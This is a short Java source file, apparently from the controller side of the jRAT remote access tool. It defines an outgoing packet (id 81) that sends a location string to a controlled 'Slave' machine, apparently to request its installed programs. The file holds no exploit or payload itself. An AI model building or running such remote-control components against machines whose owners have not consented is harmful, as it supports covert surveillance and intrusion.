package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet81InstalledPrograms extends AbstractOutgoingPacket {

	private String location;

	public Packet81InstalledPrograms(String location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(location);
	}

	@Override
	public byte getPacketId() {
		return 81;
	}

}
